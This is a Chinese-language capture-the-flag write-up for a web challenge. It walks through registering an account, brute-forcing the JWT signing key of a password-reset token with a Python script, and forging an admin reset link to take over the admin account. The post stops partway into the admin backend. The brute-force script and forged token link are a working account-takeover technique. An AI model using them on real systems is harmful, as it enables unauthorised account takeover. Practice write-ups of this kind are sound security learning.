---
title: "Web-2-组合拳！"
published: 2024-11-26
category: CTF
---

![](https://pic.npiter.de/file/1771513389197_20260219230257617.png)

打开发现是登录页面。

![](https://pic.npiter.de/file/1771513392973_20260219230257618.png)

尝试 admin 加随机密码无效，也没有提示用户是否存在，直接换思路。

## 注册账号

![](https://pic.npiter.de/file/1771513393080_20260219230257619.png)

可以注册，但登录后显示没有权限，看来必须是 admin 账号才行。

## 重置密码突破口

注意到有重置密码功能，查了一下资料。

![](https://pic.npiter.de/file/1771513403670_20260219230257621.png)

![](https://pic.npiter.de/file/1771513396345_20260219230257620.png)

重置密码会发送带 JWT token 的链接。可以用自己注册的账号先拿到一个合法 token，然后暴力破解 JWT 的签名密钥，再伪造 admin 的重置链接。

## dirsearch 扫描

![](https://pic.npiter.de/file/1771513410487_20260219230257622.png)

![](https://pic.npiter.de/file/1771513410195_20260219230257623.png)

## 暴力破解 JWT 密钥

```python
from authlib.jose import jwt
from authlib.jose.errors import BadSignatureError
from string import ascii_letters, digits
from itertools import product
from tqdm import tqdm

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiOTA5NzI3NzE1QHFxLmNvbSIsImVtYWlsIjoiOTA5NzI3NzE1QHFxLmNvbSIsInR5cGUiOjN9.Fxhwn5QJl74QAMVcYzLAXdT1tgies-IAWiXGoghWXBA"

# 忽略特殊符号，仅遍历字母和数字组合
for i in tqdm(product(list(ascii_letters + digits), repeat=4), desc='attaching...'):
    i = "".join(i)
    try:
        jwt.decode(token, key=i)
        exit(f'key: {i}')
    except BadSignatureError:
        continue
```

![](https://pic.npiter.de/file/1771513415756_20260219230257625.png)

## 伪造 Admin 重置链接

拿到密钥后，用相同密钥签发 admin 邮箱的重置 token：

![](https://pic.npiter.de/file/1771513414471_20260219230257624.png)

构造重置链接访问：

```
http://node6.anna.nssctf.cn:20562/#/reset_token?email=Administrator@163.com&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJlbWFpbCI6IkFkbWluaXN0cmF0b3JAMTYzLmNvbSIsInR5cGUiOjMsImV4cCI6MTczMjYyNjkxOH0.ff-9dF2mQvNTyYpSF0OxZ2dR_iKzvZOugtaIYH7nFQI
```

![](https://pic.npiter.de/file/1771513420859_20260219230257626.png)

## 登录后台

成功重置 admin 密码后登录，发现资源下载器，base64 解码得到 `printf("hello world")`，继续分析。

![](https://pic.npiter.de/file/1771513424371_20260219230257627.png)

## 总结

- JWT 暴力破解密钥
- 伪造重置密码链接
- 组合拳：注册账号 → 获取 JWT → 爆破密钥 → 伪造 admin token → 重置密码
